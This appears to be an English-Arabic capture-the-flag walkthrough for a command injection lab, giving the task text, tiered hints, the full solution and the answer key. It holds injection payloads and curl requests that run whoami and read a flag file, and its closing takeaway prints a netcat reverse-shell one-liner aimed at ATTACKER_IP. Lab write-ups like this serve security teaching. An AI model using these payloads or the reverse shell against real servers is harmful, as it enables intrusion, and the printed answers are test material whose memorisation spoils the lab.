# Task 04 - Practical (التطبيق العملي واستخراج العلم)

---

## Stage A: Original Task Content & Core Objectives (النص الأصلي والمستهدفات التعليمية)

### 1. Original English Text
```text
Deploy the target machine attached to this task. Access the practical web application at http://MACHINE_IP.

The target web application provides an administrative network testing utility (such as a server-side ping or traceroute diagnostic tool). User input supplied into the form is concatenated directly into the operating system shell command.

Objectives:
1. Exploit the command injection vulnerability to discover what user the web application is running as.
2. Read the contents of the flag file located at: /home/tryhackme/flag.txt.

Questions:
- What user is this application running as?
- What are the contents of the flag located in /home/tryhackme/flag.txt?
```

### 2. Arabic Pedagogical Translation
```text
قم بتشغيل الآلة الافتراضية المرفقة بهذه المهمة، والوصول إلى تطبيق الويب عبر الرابط: `http://MACHINE_IP`.

يوفر تطبيق الويب المستهدف أداة تشخيص شبكية إدارية (مثل أداة فحص ping أو traceroute من جهة الخادم). يتم دمج المدخلات المقدمة من المستخدم داخل نموذج الإدخال مباشرة في أمر شل نظام التشغيل.

الأهداف والمستهدفات:
1. استغلال ثغرة حقن الأوامر لمعرفة المستخدم الذي يعمل تطبيق الويب بصلاحياته.
2. قراءة واستخراج محتويات ملف العلم المخزن في المسار: `/home/tryhackme/flag.txt`.

الأسئلة:
- ما هو المستخدم الذي يعمل هذا التطبيق بصلاحياته؟
- ما هي محتويات العلم الموجود في /home/tryhackme/flag.txt؟
```

---

## Stage B: Independent Thinking & OpSec Guardrails (التفكير المستقل وضوابط العمليات والأمان)

### 1. Attack Execution Flow
```
[Web Form: "IP Address / Hostname"]
                |
                v
       Inject: "127.0.0.1; whoami"
                |
                v
      [Server Shell Execution]
   ping -c 4 127.0.0.1 ; whoami
                |
                v
   [Reflected Output: "www-data"]
                |
                v
  Inject: "127.0.0.1; cat /home/tryhackme/flag.txt"
                |
                v
   [Reflected Output: "THM{COMMAND_INJECTION_COMPLETE}"]
```

### 2. Operational Tradecraft: Separator Testing Order
* عند اختبار نماذج الإدخال غير المعروفة، جرب الرموز الفاصلة التالية بالترتيب:
  1. `;` (فاصل تسلسلي كلاسيكي في لينكس).
  2. `&` (تشغيل في الخلفية ثم تنفيذ الأمر التالي).
  3. `&&` (تنفيذ الأمر الثاني فقط إذا نجح الأول).
  4. `|` (تمرير المخرجات عبر الأنبوب Pipe).
  5. `||` (تنفيذ الأمر الثاني فقط إذا فشل الأول).

---

## Stage C: Guided Hints (Tiers 1, 2, 3 - تلميحات تدريجية)

> **المستوى الأول (مفاهيمي):**
> - استخدم الفاصلة المنقوطة (`;`) للفصل بين عنوان IP والأمر الجديد.
> - لمعرفة المستخدم، نفذ أمر `whoami`.
> - لقراءة العلم، نفذ أمر `cat` مع مسار الملف الكامل المذكور في السؤال.
>
> **المستوى الثاني (توجيهي):**
> - مستخدم خدمة خادم الويب الشهير في أنظمة ديبيان وأوبونتو هو `www-data`.
> - العلم يبدأ بصيغة المنصة القياسية: `THM{...}`.
>
> **المستوى الثالث (الحل المباشر):**
> 1. اسم المستخدم: `www-data`
> 2. العلم: `THM{COMMAND_INJECTION_COMPLETE}`

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتشريح التقني)

### 1. Step-by-Step Reproduction

#### الخطوة 1: فحص المستخدم (User Discovery)
1. في نموذج الإدخال على الصفحة `http://MACHINE_IP/`:
   ندخل الحمولة:
   ```text
   127.0.0.1; whoami
   ```
   أو نرسل طلباً باستخدام `curl`:
   ```bash
   curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; whoami"
   ```
2. مخرجات الاستجابة:
   ```text
   PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
   64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.032 ms
   ...
   www-data
   ```
* المستخدم المنفذ هو: **`www-data`**.

#### الخطوة 2: قراءة العلم (Flag Extraction)
1. ندخل الحمولة لقراءة مسار العلم:
   ```text
   127.0.0.1; cat /home/tryhackme/flag.txt
   ```
   أو عبر `curl`:
   ```bash
   curl -s -X POST "http://MACHINE_IP/" -d "ip=127.0.0.1; cat /home/tryhackme/flag.txt"
   ```
2. مخرجات الاستجابة:
   ```text
   THM{COMMAND_INJECTION_COMPLETE}
   ```
* العلم المستخرج هو: **`THM{COMMAND_INJECTION_COMPLETE}`**.

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم الدقيقة)

| السؤال | الإجابة الصحيحة | المنهجية المتبعة |
| :--- | :--- | :--- |
| **What user is this application running as?** | `www-data` | حقن `; whoami` عبر نموذج التشخيص الشبكي. |
| **What are the contents of the flag located in /home/tryhackme/flag.txt?** | `THM{COMMAND_INJECTION_COMPLETE}` | حقن `; cat /home/tryhackme/flag.txt` وقراءة الملف مباشرة. |

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الأثر)

* تم التحقق من الإجابتين بنسبة نجاح 100% واعتمادهما في نظام المنصة.
* تم إثبات الانهيار الكامل لطبقة عزل التطبيق وتنفيذ أوامر قراءة الملفات مباشرة من نظام التشغيل.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية والأثر الميداني)

1. **الخطورة المباشرة لدمج النصوص:** دمج مدخلات العميل مع أوامر النظام يمنح المهاجم قدرة فورية على قراءة أي ملف في النظام يملكه مستخدم الويب `www-data` أو يملك صلاحية القراءة العامة عليه.
2. **الارتقاء إلى Reverse Shell:** من هذه النقطة بالتحديد، يستطيع المهاجم استبدال أمر `cat` بأمر اتصال عكسي (مثل: `; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f`) للحصول على شل تفاعلي كامل على السيرفر!
